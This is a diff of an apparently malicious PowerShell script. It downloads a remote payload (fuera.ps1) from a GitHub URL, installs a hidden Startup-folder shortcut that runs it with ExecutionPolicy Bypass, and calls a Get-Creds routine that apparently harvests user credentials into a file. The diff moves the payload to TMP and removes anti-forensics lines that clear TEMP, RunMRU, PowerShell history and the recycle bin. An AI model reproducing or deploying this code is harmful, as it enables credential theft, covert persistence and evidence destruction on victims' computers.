@@ -1,9 +1,9 @@
-Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/fuera.ps1" -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.ps1"
+Invoke-WebRequest -URI "https://github.com/nonamezxcvbnm/d/raw/main/fuera.ps1" -OutFile "$env:TMP\Fuera.ps1"
 
 $WScriptShell = New-Object -ComObject WScript.Shell
 $shortcut = $WScriptShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.lnk")
 $shortcut.TargetPath = "powershell"
-$shortcut.Arguments = "-NoProfile -w h -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Fuera.ps1`""
+$shortcut.Arguments = "-NoProfile -w h -ExecutionPolicy Bypass -File `"$env:TMP\Fuera.ps1`""
 $shortcut.Save()
 
 $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm).txt"
@@ -67,8 +67,3 @@ return $creds
 }
 
 $creds = Get-Creds
-
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
